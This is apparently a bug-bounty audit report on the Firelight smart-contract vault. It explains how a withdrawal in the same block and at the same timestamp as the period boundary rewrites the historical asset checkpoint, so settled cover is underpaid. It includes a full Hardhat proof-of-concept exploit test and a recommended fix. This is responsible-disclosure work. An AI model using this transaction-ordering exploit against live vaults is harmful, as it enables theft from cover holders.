# 90411 sc high same timestamp checkpoint corruption in withdraw causes theft through underpaid settled cover

**Submitted on Aug 24th 2026 at 21:36:17 UTC by @Kalyantr for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90411
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`FirelightVault.withdraw()` is delayed: it queues assets for `P+1`, and `claimWithdraw(P+1)` is only possible in `P+2`. Pending withdrawals are meant to remain slashable during the payout window.

The issue is not an instant exit. The issue is that a withdrawal at the exact period‑start timestamp changes the historical cap used by `payout()` after the allocator has already committed capacity from the pre‑withdrawal value.

## Vulnerability Details

Period‑P cover capacity is derived from the vault’s historical asset lookup at the period start `T`:

```
$.vault.totalAssetsAt($.vault.currentPeriodStart())
```

`commitAllocation()` validates capacity using that value, then stores only the derived capacity in the allocation commitment.

`withdraw()` is delayed: it queues assets for `P+1` rather than transferring them immediately. However, it also records the post‑withdrawal active asset balance at `Time.timestamp()`. If `commitAllocation()` executes first and `withdraw()` is later in the same period‑boundary block, both calls use timestamp `T`.

The withdrawal writes a checkpoint at `T` that changes the later result of `totalAssetsAt(T)` from the pre‑withdrawal balance to the post‑withdrawal balance.

`settleCoverOrder()` uses the already stored commitment and does not re‑read vault assets, so cover can still be settled and its CoverNFT minted.

`payout()` later re‑reads `totalAssetsAt(capturePeriodStart)` as its exposure cap. Pending withdrawals remain in the payout source list, but `paidAmount` is already capped by the corrupted historical value. The result is an underpayment of settled cover while residual value remains with vault stakers.

Transactions included in the same EVM block share block.timestamp, the PoC asserts the commit transaction executes before the withdrawal transaction in that boundary block.

A normal withdrawal later in P leaves the period-start lookup unchanged and remains fully slashable through its pending-withdrawal bucket.

## Impact Details

**Selected impact**: Critical — Direct theft of any user funds.

A valid settled cover claim can be underpaid by the amount removed from the period‑start exposure cap after capacity was committed.

In the PoC, A and B each deposit 100 assets. The allocator commits and settles 200 cover for P. At the start of P, `commitAllocation()` first observes `totalAssetsAt(T) = 200`. A then requests withdrawal of 100 in the same block, causing `totalAssetsAt(T)` to resolve to 100.

A later 200‑asset payout has 200 payable sources:

* 100 active assets belonging to B
* 100 pending withdrawal assets belonging to A

However, payout is capped at the corrupted 100 historical value and transfers only 100 to the protocol‑configured payout receiver. The 100 payment is drawn pro‑rata: 50 from B’s active assets and 50 from A’s pending withdrawal.

Result:

```
Settled cover:                  200
Paid to payout receiver:        100
Unpaid settled cover:           100
A residual claim in P+2:         50
B remaining active value:        50
```

Without the same‑timestamp withdrawal, the cap remains 200 and the same claim pays 200, leaving both A’s pending withdrawal and B’s active assets at zero.

The unpaid 100 is a direct loss to the settled‑cover payout. It remains in staker‑side value rather than reaching the protocol’s configured payout recipient. `payoutReceiver` is not assumed to be the CoverNFT owner; it is the recipient configured by the protocol for valid vault payouts.

## Proof of Concept

## Proof of Concept

Add the below test case to `test/FirelightVault`

Run the command `npx hardhat test test/FirelightVault/periodBoundaryPayout.poc.js --no-compile`

```
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

const { deployVault } = require("../setup/fixtures.js");

const ASSETS = 100n;
const CAPACITY = 100n * 10n ** 18n;
const POOLED_ASSETS = ASSETS * 2n;
const POOLED_CAPACITY = CAPACITY * 2n;
const CHAIN_ID = 1;
const PROTOCOL = "PeriodBoundaryProtocol";
const MARKET = ethers.id("period-boundary-market");
const COVER_RATE_ANNUAL = 500;

const abiCoder = ethers.AbiCoder.defaultAbiCoder();
const marketId = ethers.keccak256(abiCoder.encode(["uint64", "string", "bytes32"], [CHAIN_ID, PROTOCOL, MARKET]));

const marketCoverAllocation = { marketId, allocatedCover: CAPACITY };

async function deployRealVaultAndAllocator() {
  const ctx = await deployVault({ decimals: 0n, initial_deposit_limit: 1_000n });
  const [staker, allocatorRole, buyer] = ctx.users;
  const firstLossBuffer = ethers.Wallet.createRandom().address;

  const MockAggregatorV3 = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await MockAggregatorV3.deploy(18, 10n ** 18n); // $1 per vault asset

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    [
      "Firelight Cover",
      "FLCOVER",
      "",
      ctx.deployer.address,
      ctx.deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
    ],
    { kind: "transparent" },
  );

  const CoverOrderAllocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    CoverOrderAllocator,
    [
      {
        vault: ctx.firelight_vault.target,
        premiumCollector: ctx.deployer.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        // The commit is mined one period after deployment, so the initial $1 answer remains fresh.
        maxPriceAge: ctx.config.period_configuration_duration * 2,
        premiumTokens: [ctx.token_contract.target],
        admin: ctx.deployer.address,
        adminRole: ctx.deployer.address,
        curatorRole: ctx.deployer.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: ctx.deployer.address,
        initialProtocolConcentrations: [{ chainId: CHAIN_ID, protocol: PROTOCOL, maxProtocolConcentrationBps: 10_000 }],
        newMarkets: [{ chainId: CHAIN_ID, protocol: PROTOCOL, market: MARKET }],
        // No first-loss balance and leverage / CAR == 1 makes 100 vault assets equal 100e18 capacity.
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: ctx.token_contract.target,
          firstLossBuffer,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    {
      kind: "transparent",
      unsafeAllow: ["missing-initializer-call"],
    },
  );

  await coverNFT.connect(ctx.deployer).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  return { ...ctx, staker, allocatorRole, buyer, allocator, coverNFT };
}

describe("FirelightVault / period-boundary payout PoC", function () {
  it("settles cover after a same-timestamp withdrawal rewrites the payout snapshot to zero", async function () {
    const {
      token_contract,
      firelight_vault: vault,
      deployer,
      allocator,
      allocatorRole,
      staker,
      buyer,
      coverNFT,
      payout_signer,
      payout_receiver,
      utils,
    } = await loadFixture(deployRealVaultAndAllocator);

    await utils.mintAndApprove(ASSETS, staker);
    await vault.connect(staker).deposit(ASSETS, staker.address);

    const periodStart = await vault.currentPeriodEnd();
    const commitmentPeriod = (await vault.currentPeriod()) + 1n;

    // Create an order while P - 1 is current; the allocator assigns it to P.
    // The buyer holds and approves enough native premium for the later settlement.
    const orderId = await allocator.nextCoverOrderId();
    await utils.mintAndApprove(ASSETS, buyer);
    await token_contract.connect(buyer).approve(allocator.target, ASSETS);
    await allocator
      .connect(deployer)
      .createCoverOrder(
        buyer.address,
        buyer.address,
        buyer.address,
        token_contract.target,
        [{ marketId, coverRateAnnual: COVER_RATE_ANNUAL, coverAmount: CAPACITY }],
        0,
      );
    expect((await allocator.getCoverOrder(orderId)).period).to.equal(commitmentPeriod);

    const tree = StandardMerkleTree.of([[orderId, [[marketId, CAPACITY]]]], ["uint256", "(bytes32,uint256)[]"]);

    // No checkpoint is written merely because a period will begin: this future lookup resolves
    // to the deposit checkpoint, which is the 100-asset input the allocator validates.
    expect(await vault.totalAssetsAt(periodStart)).to.equal(ASSETS);

    let automineDisabled = false;
    try {
      await ethers.provider.send("evm_setAutomine", [false]);
      automineDisabled = true;
      await time.setNextBlockTimestamp(periodStart);

      // These are deliberately submitted in this order for one block at the exact period boundary.
      const commitTx = await allocator
        .connect(allocatorRole)
        .commitAllocation(commitmentPeriod, tree.root, CAPACITY, CAPACITY, {
          gasLimit: 2_000_000n,
        });
      const withdrawTx = await vault
        .connect(staker)
        .withdraw(ASSETS, staker.address, staker.address, { gasLimit: 2_000_000n });

      await ethers.provider.send("hardhat_mine", ["0x1", "0x0"]);
      const commitReceipt = await ethers.provider.getTransactionReceipt(commitTx.hash);
      const withdrawReceipt = await ethers.provider.getTransactionReceipt(withdrawTx.hash);
      expect(commitReceipt).to.not.equal(null);
      expect(withdrawReceipt).to.not.equal(null);
      expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber);

      const boundaryBlock = await ethers.provider.getBlock(commitReceipt.blockNumber);
      expect(BigInt(boundaryBlock.timestamp)).to.equal(periodStart);
      expect(boundaryBlock.transactions).to.deep.equal([commitTx.hash, withdrawTx.hash]);
    } finally {
      if (automineDisabled) await ethers.provider.send("evm_setAutomine", [true]);
    }

    expect(await vault.currentPeriod()).to.equal(commitmentPeriod);

    const commitment = await allocator.getAllocationCommitment(commitmentPeriod);
    expect(commitment.totalAvailableCapacity).to.equal(CAPACITY);
    expect(commitment.totalDeclaredAllocated).to.equal(CAPACITY);

    // The withdrawal's _logTrace writes a zero-valued checkpoint using the same timestamp
    // that the allocator used as a 100-asset period-start lookup.
    expect(await vault.totalAssetsAt(periodStart)).to.equal(0n);
    const withdrawalPeriod = commitmentPeriod + 1n;
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(ASSETS);

    // Settlement happens after the withdrawal. It consumes the stored 100e18 commitment,
    // never re-reads the vault's now-zero period-start checkpoint, and mints real cover.
    await expect(
      allocator.connect(allocatorRole).settleCoverOrder(orderId, [marketCoverAllocation], tree.getProof(0)),
    ).to.emit(allocator, "CoverOrderSettled");
    expect((await allocator.getAllocationCommitment(commitmentPeriod)).totalSettledCover).to.equal(CAPACITY);
    expect((await allocator.getCoverOrder(orderId)).allocatedCoverAmount).to.equal(CAPACITY);
    expect(await coverNFT.ownerOf(orderId)).to.equal(buyer.address);

    // payoutReceiver is the protocol-configured payout recipient; it need not be the cover buyer.
    await expect(vault.connect(payout_signer).payout(payout_receiver.address, ASSETS, periodStart))
      .to.emit(vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, ASSETS, 0n, periodStart);
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(0n);

    // A withdrawal assigned to P + 1 becomes claimable once P + 1 has ended (current period P + 2).
    await time.increaseTo((await vault.nextPeriodEnd()) + 1n);
    await expect(vault.connect(staker).claimWithdraw(withdrawalPeriod))
      .to.emit(vault, "CompleteWithdraw")
      .withArgs(staker.address, ASSETS, withdrawalPeriod);
    expect(await token_contract.balanceOf(staker.address)).to.equal(ASSETS);
  });

  it("caps a settled pooled-cover payout at the post-withdrawal snapshot while one staker remains active", async function () {
    const {
      token_contract,
      firelight_vault: vault,
      deployer,
      allocator,
      allocatorRole,
      staker,
      buyer,
      payout_signer,
      payout_receiver,
      utils,
    } = await loadFixture(deployRealVaultAndAllocator);
    const honestStaker = (await ethers.getSigners())[10];

    await utils.mintAndApprove(ASSETS, staker);
    await vault.connect(staker).deposit(ASSETS, staker.address);
    await utils.mintAndApprove(ASSETS, honestStaker);
    await vault.connect(honestStaker).deposit(ASSETS, honestStaker.address);

    const periodStart = await vault.currentPeriodEnd();
    const commitmentPeriod = (await vault.currentPeriod()) + 1n;
    expect(await vault.totalAssetsAt(periodStart)).to.equal(POOLED_ASSETS);

    // The P - 1 order will be settled for the full pooled capacity in P.
    const orderId = await allocator.nextCoverOrderId();
    await utils.mintAndApprove(ASSETS, buyer);
    await token_contract.connect(buyer).approve(allocator.target, ASSETS);
    await allocator
      .connect(deployer)
      .createCoverOrder(
        buyer.address,
        buyer.address,
        buyer.address,
        token_contract.target,
        [{ marketId, coverRateAnnual: COVER_RATE_ANNUAL, coverAmount: POOLED_CAPACITY }],
        0,
      );
    const allocation = { marketId, allocatedCover: POOLED_CAPACITY };
    const tree = StandardMerkleTree.of([[orderId, [[marketId, POOLED_CAPACITY]]]], ["uint256", "(bytes32,uint256)[]"]);

    let automineDisabled = false;
    try {
      await ethers.provider.send("evm_setAutomine", [false]);
      automineDisabled = true;
      await time.setNextBlockTimestamp(periodStart);

      const commitTx = await allocator
        .connect(allocatorRole)
        .commitAllocation(commitmentPeriod, tree.root, POOLED_CAPACITY, POOLED_CAPACITY, {
          gasLimit: 2_000_000n,
        });
      // Only A leaves; B stays active in the pool.
      const withdrawTx = await vault
        .connect(staker)
        .withdraw(ASSETS, staker.address, staker.address, { gasLimit: 2_000_000n });

      await ethers.provider.send("hardhat_mine", ["0x1", "0x0"]);
      const boundaryBlock = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
      expect(BigInt(boundaryBlock.timestamp)).to.equal(periodStart);
      expect(boundaryBlock.transactions).to.deep.equal([commitTx.hash, withdrawTx.hash]);
    } finally {
      if (automineDisabled) await ethers.provider.send("evm_setAutomine", [true]);
    }

    // A's withdrawal writes the period-start key with the 100 assets B still has active.
    expect(await vault.totalAssetsAt(periodStart)).to.equal(ASSETS);
    expect(await vault.totalAssets()).to.equal(ASSETS);
    const withdrawalPeriod = commitmentPeriod + 1n;
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(ASSETS);

    await allocator.connect(allocatorRole).settleCoverOrder(orderId, [allocation], tree.getProof(0));
    expect((await allocator.getAllocationCommitment(commitmentPeriod)).totalSettledCover).to.equal(POOLED_CAPACITY);

    await expect(vault.connect(payout_signer).payout(payout_receiver.address, POOLED_ASSETS, periodStart))
      .to.emit(vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, POOLED_ASSETS, ASSETS, periodStart);
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(ASSETS);

    // The 100 payout is drawn pro rata from B's 100 active assets and A's 100 pending withdrawal.
    // Therefore A's pending claim and B's active position each retain 50, rather than A escaping intact.
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(ASSETS / 2n);
    expect(await vault.pendingWithdrawAssets()).to.equal(ASSETS / 2n);
    expect(await vault.maxWithdraw(honestStaker.address)).to.equal(ASSETS / 2n);

    await time.increaseTo((await vault.nextPeriodEnd()) + 1n);
    await expect(vault.connect(staker).claimWithdraw(withdrawalPeriod))
      .to.emit(vault, "CompleteWithdraw")
      .withArgs(staker.address, ASSETS / 2n, withdrawalPeriod);
    expect(await token_contract.balanceOf(staker.address)).to.equal(ASSETS / 2n);
  });
});

```

The test uses the real `FirelightVault`, `CoverOrderAllocator`, and `CoverNFT`. It proves both:

* whole-book limit: 100 committed/settled cover, same-block withdrawal changes the cap to zero, payout is zero
* general case: A exits at T, B remains, 200 settled cover is capped at a 100 payout, and A later claims the 50 residual.

## Recommendation

Use one strictly-before-timestamp exposure getter for both capacity calculation and payout:

```
function totalAssetsBefore(uint48 timestamp) public view returns (uint256) {
    if (timestamp == 0) return 0;
    return _traceTotalAssets.upperLookupRecent(timestamp - 1);
}
```

Replace both reads:

```
// CoverOrderAllocator._computeAvailableCapacity
$.vault.totalAssetsBefore($.vault.currentPeriodStart())

// FirelightVault.payout
totalAssetsBefore(capturePeriodStart)
```

This preserves generic `totalAssetsAt()` history while making every same-T state mutation irrelevant to period-P exposure.
